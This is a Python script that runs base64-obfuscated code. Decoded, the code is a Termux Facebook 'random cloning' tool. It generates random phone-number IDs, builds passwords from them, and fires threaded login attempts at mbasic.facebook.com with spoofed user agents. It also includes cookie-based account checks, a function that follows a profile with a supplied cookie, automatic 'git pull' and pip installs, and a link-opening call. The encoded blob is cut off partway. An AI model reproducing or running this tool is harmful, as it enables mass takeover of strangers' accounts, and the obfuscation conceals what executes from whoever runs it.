import base64
exec(base64.b64decode("I0dpZnQgQnkgQVNSQUZVTCBJU0xBTSDwnZCP8J2QiPCdkI3wnZCI8J2Qii3wnZCS8J2Qh/CdkIDwnZCW8J2QjvCdkI0NCiNHcm91cDog8J2Qj/CdkIjwnZCN8J2QiPCdkIot8J2QkvCdkIfwnZCA8J2QlvCdkI7wnZCNIFRFUk1VWCBIQUxQSU5HIFpPTkUNCiMgMm5kIEdyb3VwIDog8J2Qj/CdkIjwnZCN8J2QiPCdkIot8J2QkvCdkIfwnZCA8J2QlvCdkI7wnZCNIFNDUklQVCBBTkQgSUQgR0lGVCBaT05FDQppbXBvcnQgb3Msc3lzLHRpbWUsanNvbixyYW5kb20scmUsc3RyaW5nLHBsYXRmb3JtLGJhc2U2NCx1dWlkDQpvcy5zeXN0ZW0oImdpdCBwdWxsIikNCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcA0KZnJvbSBiczQgaW1wb3J0IEJlYXV0aWZ1bFNvdXANCmltcG9ydCByZXF1ZXN0cyBhcyByZXNzDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRlDQpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQ0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcA0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCBhcyB3YWt0dQ0KdHJ5Og0KICAgIGltcG9ydCByZXF1ZXN0cw0KICAgIGZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMgVGhyZWFkUG9vbA0KICAgIGltcG9ydCBtZWNoYW5pemUNCiAgICBmcm9tIHJlcXVlc3RzLmV4Y2VwdGlvbnMgaW1wb3J0IENvbm5lY3Rpb25FcnJvcg0KZXhjZXB0IE1vZHVsZU5vdEZvdW5kRXJyb3I6DQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBtZWNoYW5pemUgcmVxdWVzdHMgZnV0dXJlcyBiczQ9PTIgPiAvZGV2L251bGwnKQ0KICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgYnM0JykNCiAgICANCmRlZiBjZWtfYXBrKHNlc3Npb24sY29raSk6DQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9YWN0aXZlIixjb29raWVzPXsiY29va2llIjpjb2tpfSkudGV4dA0KICAgIHNvcCA9IEJlYXV0aWZ1bFNvdXAodywiaHRtbC5wYXJzZXIiKQ0KICAgIHggPSBzb3AuZmluZCgiZm9ybSIsbWV0aG9kPSJwb3N0IikNCiAgICBnYW1lID0gW2kudGV4dCBmb3IgaSBpbiB4LmZpbmRfYWxsKCJoMyIpXQ0KICAgIGlmIGxlbihnYW1lKT09MDoNCiAgICAgICAgcHJpbnQoZidcciVzWyVzISVzXSAlc1NvcnJ5IHRoZXJlIGlzIG5vIEFjdGl2ZSAgQXBrJXMgICclKE4sTSxOLE0sTikpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZidcclvDsMW4wqTigJNdICVzIFx4MWJbMTs5NW0gGiBZb3VyIEFjdGl2ZSBBcHBzIBogICAgIDp7V0hJVEV9JyUoR1JFRU4pKQ0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KICAgICAgICAgICAgcHJpbnQoZiJcclslcyVzXSAlcyVzIiUoTixpKzEsZ2FtZVtpXS5yZXBsYWNlKCJEaXRhbWJhaGthbiBwYWRhIiwiIERpdGFtYmFoa2FuIHBhZGEiKSxOKSkNCiAgICAgICAgI2Vsc2U6DQogICAgICAgICAgICAjcHJpbnQoZidcciAlc1slcyElc10gU29ycnksIEFwayBjaGVjayBmYWlsZWQgaW52YWxpZCBjb29raWUnJShOLE0sTikpDQogICAgdz1zZXNzaW9uLmdldCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9aW5hY3RpdmUiLGNvb2tpZXM9eyJjb29raWUiOmNva2l9KS50ZXh0DQogICAgc29wID0gQmVhdXRpZnVsU291cCh3LCJodG1sLnBhcnNlciIpDQogICAgeCA9IHNvcC5maW5kKCJmb3JtIixtZXRob2Q9InBvc3QiKQ0KICAgIGdhbWUgPSBbaS50ZXh0IGZvciBpIGluIHguZmluZF9hbGwoImgzIildDQogICAgaWYgbGVuKGdhbWUpPT0wOg0KICAgICAgICBwcmludChmJ1xyJXNbJXMhJXNdICVzU29ycnkgdGhlcmUgaXMgbm8gRXhwaXJlZCBBcGslcyAgICAgICAgICAgXG4nJShOLE0sTixNLE4pKQ0KICAgIGVsc2U6DQogICAgICAgIHByaW50KGYnXHJbw7DFuMKk4oCTXSAlcyBceDFiWzE7OTVtIBogWW91ciBFeHBpcmVkIEFwcHMgGiAgICA6e1dISVRFfSclKE0pKQ0KICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oZ2FtZSkpOg0KICAgICAgICAgICAgcHJpbnQoZiJcclslcyVzXSAlcyVzIiUoTixpKzEsZ2FtZVtpXS5yZXBsYWNlKCJLZWRhbHV3YXJzYSIsIiBLZWRhbHV3YXJzYSIpLE4pKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJycpDQoNCmRlZiBmb2xsb3coc2VsZiwgc2Vzc2lvbiwgY29raSk6DQogICAgICAgIHIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KCdodHRwczovL2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9tZW50YWwyOS4yLjAnLCB7DQogICAgICAgICAgICAnY29va2llJzogY29raSB9LCAqKignY29va2llcycsKSkudGV4dCwgJ2h0bWwucGFyc2VyJykNCiAgICAgICAgZ2V0ID0gci5maW5kKCdhJywgJ0lrdXRpJywgKiooJ3N0cmluZycsKSkuZ2V0KCdocmVmJykNCiAgICAgICAgc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScgKyBzdHIoZ2V0KSwgew0KICAgICAgICAgICAgJ2Nvb2tpZSc6IGNva2kgfSwgKiooJ2Nvb2tpZXMnLCkpLnRleHQNCg0KDQpVTU89IkktQU0tIg0KdHR0ID0gIk1FSEFESSINCiAgICAgICAgICAgDQoNCmNsYXNzIGphbGFuOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB6KToNCiAgICAgICAgZm9yIGUgaW4geiArICJcbiI6DQogICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKGUpDQogICAgICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4wMDkpDQogICAgICANCiAgICAgDQpQID0gJ1x4MWJbMTs5N20nDQpNID0gJ1x4MWJbMTs5MW0nDQpIID0gJ1x4MWJbMTs5Mm0nDQpLID0gJ1x4MWJbMTs5M20nDQpCID0gJ1x4MWJbMTs5NG0nDQpVID0gJ1x4MWJbMTs5NW0nIA0KTyA9ICdceDFiWzE7OTZtJw0KTiA9ICdceDFiWzBtJyAgICANClogPSAiXDAzM1sxOzMwbSINCnNpciA9ICdcMDMzWzQxbVx4MWJbMTs5N20nDQp4ID0gJ1wzM1ttJyAjIERFRkFVTFQNCm0gPSAnXHgxYlsxOzkxbScgI1JFRCArDQprID0gJ1wwMzNbOTNtJyAjIEtVTklORyArDQp4ciA9ICdceDFiWzE7OTJtJyAjIEhJSkFVICsNCmhoID0gJ1wwMzNbMzJtJyAjIEhJSkFVIC0NCnUgPSAnXDAzM1s5NW0nICMgVU5HVQ0Ka2sgPSAnXDAzM1szM20nICMgS1VOSU5HIC0NCmIgPSAnXDMzWzE7OTZtJyAjIEJJUlUgLQ0KcCA9ICdceDFiWzA7MzRtJyAjIEJJUlUgKw0KYXN1ID0gcmFuZG9tLmNob2ljZShbbSxrLHhyLHUsYl0pDQpteV9jb2xvciA9IFsNCiBQLCBNLCBILCBLLCBCLCBVLCBPLCBOXQ0Kd2FybmEgPSByYW5kb20uY2hvaWNlKG15X2NvbG9yKQ0Kbm93ID0gZGF0ZXRpbWUubm93KCkNCmR0X3N0cmluZyA9IG5vdy5zdHJmdGltZSgiJUg6JU0iKQ0KY3VycmVudCA9IGRhdGV0aW1lLm5vdygpDQp0YSA9IGN1cnJlbnQueWVhcg0KYnUgPSBjdXJyZW50Lm1vbnRoDQpoYSA9IGN1cnJlbnQuZGF5DQp0b2RheSA9IGRhdGUudG9kYXkoKQ0Kb3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vZ3JvdXBzLzgxNjEwMDc5MjU4ODcxMi8nKQ0KbG9nbyA9KCIiIiAgDQpcMDMzWzM2OzFt4pSM4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSQDQpcMDMzWzM2OzFt4pSCXDAzM1szNzsxbeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl1wwMzNbMzY7MW3ilojilojilZcgIOKWiOKWiOKVlyBcMDMzWzM1OzFt4paI4paI4paI4paI4paI4pWXIFwwMzNbMzQ7MW3ilojilojilZcgICAg4paI4paI4pWXIFwwMzNbMzM7MW3ilojilojilojilojilojilojilZdcMDMzWzMyOzFtIOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKVlyAgICANClwwMzNbMzY7MW3ilIJcMDMzWzM3OzFt4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdXDAzM1szNjsxbeKWiOKWiOKVkSAg4paI4paI4pWRXDAzM1szNTsxbeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl1wwMzNbMzQ7MW3ilojilojilZEgICAg4paI4paI4pWRXDAzM1szMzsxbeKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl1wwMzNbMzI7MW3ilojilojilojilojilZcgIOKWiOKWiOKVkSAgICANClwwMzNbMzY7MW3ilIJcMDMzWzM3OzFt4paI4paI4paI4paI4paI4paI4paI4pWXXDAzM1szNjsxbeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkVwwMzNbMzU7MW3ilojilojilojilojilojilojilojilZFcMDMzWzM0OzFt4paI4paI4pWRIOKWiOKVlyDilojilojilZFcMDMzWzMzOzFt4paI4paI4pWRICAg4paI4paI4pWRXDAzM1szMjsxbeKWiOKWiOKVlOKWiOKWiOKVlyDilojilojilZEgICAgDQpcMDMzWzM2OzFt4pSCXDAzM1szNzsxbeKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkVwwMzNbMzY7MW3ilojilojilZTilZDilZDilojilojilZFcMDMzWzM1OzFt4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRXDAzM1szNDsxbeKWiOKWiOKVkeKWiOKWiOKWiOKVl+KWiOKWiOKVkVwwMzNbMzM7MW3ilojilojilZEgICDilojilojilZFcMDMzWzMyOzFt4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRICAgIA0KXDAzM1szNjsxbeKUglwwMzNbMzc7MW3ilojilojilojilojilojilojilojilZFcMDMzWzM2OzFt4paI4paI4pWRICDilojilojilZFcMDMzWzM1OzFt4paI4paI4pWRICDilojilojilZFcMDMzWzM0OzFt4pWa4paI4paI4paI4pWU4paI4paI4paI4pWU4pWdXDAzM1szMzsxbeKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnVwwMzNbMzI7MW3ilojilojilZEg4pWa4paI4paI4paI4paI4pWRICAgIA0KXDAzM1szNjsxbeKUglwwMzNbMzc7MW3ilZrilZDilZDilZDilZDilZDilZDilZ1cMDMzWzM2OzFt4pWa4pWQ4pWdICDilZrilZDilZ1cMDMzWzM1OzFt4pWa4pWQ4pWdICDilZrilZDilZ0gXDAzM1szNDsxbeKVmuKVkOKVkOKVneKVmuKVkOKVkOKVnSBcMDMzWzMzOzFtIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSBcMDMzWzMyOzFt4pWa4pWQ4pWdICDilZrilZDilZDilZDilZ0gICAgDQpcMDMzWzM2OzFt4pSU4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUmCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogDQoNCg0KDQoNCg0KDQogXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlw0KIFwwMzNbMTs5M218ICAgICBcMDMzWzE7OTZtW+Kck10gQ1JFQVRFRCBCWVwzM1swO20gICA6IFwwMzNbMTs5Nm0g8J2QjPCdkIMg8J2QjPCdkITwnZCH8J2QhPCdkIPwnZCIIPCdkIfwnZCA8J2QkvCdkJLwnZCA8J2QjSAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzMybVvinJNdIEZBQ0VCT0sgICAgICA6IFwwMzNbMTszNG0g8J2QjPCdkIMg8J2QkvCdkIfwnZCA8J2QlvCdkI7wnZCNIPCdkJLwnZCO8J2QkfCdkIrwnZCA8J2QkSAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzM1bVvinJNdIEdJVEhVQiAgICAgICA6ICBcMDMzWzE7MzVtUElOSUstU0hBV09OICAgICAgICBcMDMzWzE7OTNtfA0KIFwwMzNbMTs5M218ICAgICBcMDMzWzE7MzZtW+Kck10gVE9PTCBTVEFUVVMgIDogXDAzM1sxOzM2bSBSYW5kb20gQ2xvbmluZyAgICAgIFwwMzNbMTs5M218DQogXDAzM1sxOzkzbXwgICAgIFwwMzNbMTszNW1b4pyTXSBURUFNICAgICAgICAgOiAgXDAzM1sxOzM18J2Qj/CdkIjwnZCN8J2QiPCdkIot8J2QkvCdkIfwnZCA8J2QlvCdkI7wnZCNICAgICAgICAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtfCAgICAgXDAzM1sxOzM2bVvinJNdIFRPT0wgVklSU0lPTiA6ICBcMDMzWzE7MzZtMC4wICAgICAgICAgICAgICAgICBcMDMzWzE7OTNtfA0KIFwwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cNCiBcMDMzWzE7OTFtW1wwMzNbMTs5N23igKJcMDMzWzE7OTFtXVwwMzNbMTszMm0gUExaIFNBUFBPUlQgTUUgQlJPLi4uLiAgICAgICAgICAgICAgICAgICAgXDAzM1sxOzkzbXwgICAgIA0KIFwwMzNbMTs5MW1bXDAzM1sxOzk3beKAolwwMzNbMTs5MW1dXDAzM1sxOzMybSDwnZCS8J2Qh/CdkIDwnZCW8J2QjvCdkI0gIFRFUk1VWCBDT01NRU5EIFpPTkUuLi4uICAgICAgICAgICAgXDAzM1sxOzkzbXwNCiBcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXIiIiKQ0KIA0KbG9vcCA9IDANCm9rcyA9IFtdDQpjcHMgPSBbXQ0KDQpkZWYgY2xlYXIoKToNCiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBwcmludChsb2dvKQ0KZnJvbSB0aW1lIGltcG9ydCBsb2NhbHRpbWUgYXMgbHQNCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBjbWQNCmx0eCA9IGludChsdCgpWzNdKQ0KaWYgbHR4ID4gMTI6DQogICAgYSA9IGx0eC0xMg0KICAgIHRhZyA9ICJQTSINCmVsc2U6DQogICAgYSA9IGx0eA0KICAgIHRhZyA9ICJBTSINCiAgICANCiAgICANCnRyeToNCiAgICBwcmludCgnXG5cblwwMzNbMTszM21Mb2FkaW5nIGFzc2V0IGZpbGVzIC4uLiBcMDMzWzA7OTdtJykNCiAgICB2ID0gNS4yDQogICAgdXBkYXRlID0gKCc1LjInKQ0KICAgIHVwZGF0ZSA9ICgnNS4yJykNCiAgICBpZiBzdHIodikgaW4gdXBkYXRlOg0KICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykNCiAgICBlbHNlOnBhc3MNCmV4Y2VwdDpwcmludCgnXG5cMDMzWzE7MzFtTm8gaW50ZXJuZXQgY29ubmVjdGlvbiAuLi4gXDAzM1swOzk3bScpDQojZ2xvYmFsIGZ1bmN0aW9ucw0KZGVmIGR5bmFtaWModGV4dCk6DQogICAgdGl0aWsgPSBbJy4gICAnLCcuLiAgJywnLi4uICcsJy4uLi4gJ10NCiAgICBmb3IgbyBpbiB0aXRpazoNCiAgICAgICAgcHJpbnQoJ1xyJyt0ZXh0K28pLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQ0KDQojVXNlciBhZ2VudHMNCnVnZW4yPVtdDQp1Z2VuPVtdDQogDQpmb3IgeGQgaW4gcmFuZ2UoMTAwMDApOg0KICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnDQogICAgYj1yYW5kb20uY2hvaWNlKFsnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJywnMTQnLCcxNScsJzE2JywnMTcnXSkNCiAgICBjPScgZW4tdXM7IEdULScNCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQ0KICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpDQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkNCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvJw0KICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg3MywxMDApDQogICAgaT0nMCcNCiAgICBqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQ0KICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApDQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnDQogICAgdWFrdTI9KGYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScpDQogICAgdWdlbi5hcHBlbmQodWFrdTIpDQogICAgDQojIEFQSyBDSEVDSw0KZGVmIHh4cigpOg0KICAgIHVzZXI9W10NCiAgICB0d2YgPVtdDQogICAgb3MuZ2V0dWlkDQogICAgb3MuZ2V0ZXVpZA0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KICAgIHByaW50KGxvZ28pDQogICAgcHJpbnQoZicgXDAzM1szODs1OzE5Nm1bXDAzM1szODs1OzE5NW3igKJcMDMzWzM4OzU7MTk2bV1cMDMzWzM4OzU7NDZtIEV4YW1wbGU+OiBcMDMzWzM4OzU7NDVtMDE5LFwwMzNbMzg7NTs0Nm0wMTcsXDAzM1szODs1OzE5NW0wMTh7eH0nKQ0KICAgIHByaW50KCIgXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXIikNCiAgICByazEgPSAnMDE3MScNCiAgICByazIgPSAnMDE3MicNCiAgICByazMgPSAnMDE3NScNCiAgICByazQgPSAnMDE3Jw0KICAgIGNvZGUgPSByYW5kb20uY2hvaWNlKFtyazEscmsyLHJrM10pICAgICAgICAgICAgICAgICAgICAgICMgaW5wdXQoZicgW3t4cn3DouKAk8Kge3h9XSBDaG9vc2UgOiAnKQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIHByaW50KGxvZ28pDQogICAgbGltaXQgPSBpbnQoaW5wdXQoZicgXDAzM1szODs1OzE5Nm1bXDAzM1szODs1OzE5NW3igKJcMDMzWzM4OzU7MTk2bV1cMDMzWzM4OzU7NDZtIEVYQU1QTEUgOiBcMDMzWzM4OzU7MTk1bTEwMDAwLCBcMDMzWzM4OzU7NDVtMjAwMDAsIFwwMzNbMzg7NTs0Nm01MDAwMCAgXG4gXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXG4gXDAzM1szODs1OzE5Nm1bXDAzM1szODs1OzE5NW3igKJcMDMzWzM4OzU7MTk2bV1cMDMzWzM4OzU7NDZtIFBVVCBDTE9OSU5HIExJTUlUOlwwMzNbMzg7NTs0Nm0gJykpDQogICAgZm9yIG5tYnIgaW4gcmFuZ2UobGltaXQpOg0KICAgICAgICBubXAgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmRpZ2l0cykgZm9yIF8gaW4gcmFuZ2UoNykpDQogICAgICAgIHVzZXIuYXBwZW5kKG5tcCkNCiAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBwcmludChsb2dvKQ0KICAgIHBhc3N4ID0gMA0KICAgIEhhbWlpSUQgPSBbXQ0KICAgIHByaW50KCIiKQ0KICAgIGZvciBiaWxhbCBpbiByYW5nZShwYXNzeCk6DQogICAgICAgIHB3dyA9IGlucHV0KGYiWypdIEVudGVyIFBhc3N3b3JkIHtiaWxhbCsxfSA6ICIpDQogICAgICAgIEhhbWlpSUQuYXBwZW5kKHB3dykNCiAgICB3aXRoIFRocmVhZFBvb2wobWF4X3dvcmtlcnM9NTApIGFzIG1hbnNoZXJhOg0KICAgICAgICBjbGVhcigpDQogICAgICAgIHRsID0gc3RyKGxlbih1c2VyKSkNCiAgICAgICAgamFsYW4oJyBcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXXDAzM1sxOzkzbcOXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cnKQ0KICAgICAgICBqYWxhbihmJyBcMDMzWzM4OzU7MTk2bVtcMDMzWzM4OzU7MTk1beKAolwwMzNbMzg7NTsxOTZtXVwwMzNbMzg7NTsxOTVtIFlPVVIgVE9UQUwgSURTOiBcMDMzWzM4OzU7NDZtJyt0bCkNCiAgICAgICAgamFsYW4oZicgXDAzM1szODs1OzE5Nm1bXDAzM1szODs1OzE5NW3igKJcMDMzWzM4OzU7MTk2bV1cMDMzWzM4OzU7MTk1bSBVU0UgWU9VUiBNT0JJTEUgREFUQSAnKQ0KICAgICAgICBqYWxhbihmJyBcMDMzWzM4OzU7MTk2bVtcMDMzWzM4OzU7MTk1beKAolwwMzNbMzg7NTsxOTZtXVwwMzNbMzg7NTsxOTVtIFVzZSBGbGlnaHQgTW9kZSBGb3IgU3BlZWQgVXAnKQ0KICAgICAgICBqYWxhbignIFwwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlycpDQogICAgICAgIGZvciBsb3ZlIGluIHVzZXI6DQogICAgICAgICAgICBwd3ggPSBbbG92ZVsxOl1dDQogICAgICAgICAgICB1aWQgPSBjb2RlK2xvdmUNCiAgICAgICAgICAgIGZvciBFbWFuIGluIEhhbWlpSUQ6DQogICAgICAgICAgICAgICAgcHd4LmFwcGVuZChFbWFuKQ0KICAgICAgICAgICAgICAgIHB3eC5hcHBlbmQobG92ZSkNCiAgICAgICAgICAgIG1hbnNoZXJhLnN1Ym1pdChyY3JhY2ssdWlkLHB3eCx0bCkNCiAgICBwcmludChmIlxuIFwwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl1wwMzNbMTs5M23Dl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5dcMDMzWzE7OTNtw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlyIpDQpkZWYgcmNyYWNrKHVpZCxwd3gsdGwpOg0KICAgICNwcmludCh1c2VyKQ0KICAgIGdsb2JhbCBsb29wDQogICAgZ2xvYmFsIGNwcw0KICAgIGdsb2JhbCBva3MNCiAgICBnbG9iYWwgcHJveHkNCiAgICB0cnk6DQogICAgICAgIGZvciBwcyBpbiBwd3g6DQogICAgICAgICAgICBwcm8gPSByYW5kb20uY2hvaWNlKHVnZW4pDQogICAgICAgICAgICBzZXNzaW9uID0gcmVxdWVzdHMuU2Vzc2lvbigpDQogICAgICAgICAgICBmcmVlX2ZiID0gc2Vzc2lvbi5nZXQoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScpLnRleHQNCiAgICAgICAgICAgIGxvZ19kYXRhID0gew0KICAgICAgICAgICAgICAgICJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKGZyZWVfZmIpKS5ncm91cCgxKSwNCiAgICAgICAgICAgICJqYXpvZXN0IjpyZS5zZWFyY2goJ25hbWU9Imphem9lc3QiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgIm1fdHMiOnJlLnNlYXJjaCgnbmFtZT0ibV90cyIgdmFsdWU9IiguKj8pIicsIHN0cihmcmVlX2ZiKSkuZ3JvdXAoMSksDQogICAgICAgICAgICAibGkiOnJlLnNlYXJjaCgnbmFtZT0ibGkiIHZhbHVlPSIoLio/KSInLCBzdHIoZnJlZV9mYikpLmdyb3VwKDEpLA0KICAgICAgICAgICAgInRyeV9udW1iZXIiOiIwIiwNCiAgICAgICAgICAgICJ1bnJlY29nbml6ZWRfdHJpZXMiOiIwIiwNCiAgICAgICAgICAgICJlbWFpbCI6dWlkLA0KICAgICAgICAgICAgInBhc3MiOnBzLA0KICAgICAgICAgICAgImxvZ2luIjoiTG9nIEluIn0NCiAgICAgICAgICAgIGhlYWRlcl9mcmVlZmIgPSB7ImF1dGhvcml0eSI6ICdtYmFzaWMuZmFjZWJvb2suY29tJywNCiAgICAgICAgICAgICJtZXRob2QiOiAnR0VUJywNCiAgICAgICAgICAgICJzY2hlbWUiOiAnaHR0cHMnLA0KICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjknLA0KICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1HQixlbi1VUztxPTAuOSxlbjtxPTAuOCcsDQogICAgICAgICAgICAnY